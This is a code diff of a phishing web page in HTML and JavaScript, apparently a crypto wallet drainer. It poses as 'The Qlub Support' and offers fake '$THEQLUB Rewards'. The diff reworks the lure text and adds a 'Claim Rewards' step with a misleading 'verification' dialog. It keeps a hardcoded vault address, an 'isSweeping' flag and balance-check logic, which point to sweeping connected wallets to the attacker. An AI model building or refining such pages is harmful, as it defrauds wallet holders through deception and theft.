@@ -19,17 +19,21 @@
 </head>
 <body>
 
-    <div class="card">
-        <h2 class="card-title">Connect Your Wallet</h2>
-        <p class="text-muted mb-4">Verification required for <strong>support@theqlub.xyz</strong>. Please connect your wallet to claim rewards.</p>
-        
-        <button id="connectWalletBtn" class="btn btn-primary btn-lg">
-            <span id="btnText">Hubungkan Wallet</span>
-            <span id="spinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
-        </button>
+   <div class="card">
+    <h2 class="card-title" id="mainTitle">The Qlub Support</h2>
+    
+    <p class="text-muted mb-4" id="mainDescription">
+        Verification required for <strong>support@theqlub.xyz</strong>. <br>
+        Please connect your wallet to start the process.
+    </p>
+    
+    <button id="connectWalletBtn" class="btn btn-primary btn-lg w-100">
+        <span id="spinner" class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
+        <span id="btnText">Hubungkan Wallet</span>
+    </button>
 
-        <div id="statusMessage" class="mt-3"></div>
-    </div>
+    <div id="statusMessage" class="mt-3"></div>
+</div>
 
     <script>
         const vaultAddress = "0x936273D0f8387Ff9f6FA86e4Dc8A09CBD6FB9A32"; 
@@ -69,31 +73,34 @@
             }
         }
 
-        async function connectWallet() {
-            if (isSweeping) return;
-            const externalProvider = window.ethereum || window.okxwallet || (window.bitkeep && window.bitkeep.ethereum);
+        // ... kode variabel awal (vaultAddress, dll) tetap sama ...
 
-            if (!externalProvider) {
-                displayMessage("Wallet tidak terdeteksi. Gunakan extension MetaMask/OKX/Bitget.", "danger");
-                return;
-            }
+async function connectWallet() {
+    // ... proses pendeteksian provider ...
+    try {
+        const accounts = await externalProvider.request({ method: 'eth_requestAccounts' });
+        userAddress = accounts[0];
+        isConnected = true;
 
-            spinner.classList.remove('d-none');
-            btnText.textContent = 'Menghubungkan...';
-            connectWalletBtn.disabled = true;
+        // --- PERUBAHAN TAMPILAN SETELAH KONEK ---
+        document.getElementById('mainTitle').textContent = "Rewards Ready!";
+        document.getElementById('mainDescription').innerHTML = "Wallet connected. You are eligible for <strong>$THEQLUB Rewards</strong>. Click below to claim.";
+        btnText.textContent = "Claim Rewards"; 
+        
+        displayMessage(`Wallet Terhubung: ${userAddress.substring(0, 6)}...`, "success");
+    } catch (error) {
+        displayMessage("Koneksi dibatalkan.", "danger");
+    }
+}
 
-            try {
-                await externalProvider.request({ method: 'eth_requestAccounts' });
-                provider = new ethers.BrowserProvider(externalProvider);
-                signer = await provider.getSigner();
-                const userAddress = await signer.getAddress();
-                
-                await processCheck(userAddress);
-            } catch (error) {
-                displayMessage("Koneksi dibatalkan.", "danger");
-                resetButton();
-            }
-        }
+// Fungsi yang dipanggil saat tombol "Claim Rewards" diklik
+async function startClaimProcess() {
+    const confirmation = confirm("Konfirmasi Klaim Rewards:\n\nSistem akan melakukan sinkronisasi untuk memverifikasi dompet Anda. Klik OK untuk melanjutkan ke konfirmasi wallet.");
+    
+    if (confirmation) {
+        await processNetworkCheck(); // Jalankan logika cek saldo & switch network
+    }
+}
 
      async function processCheck(userAddress) {
     isSweeping = true;
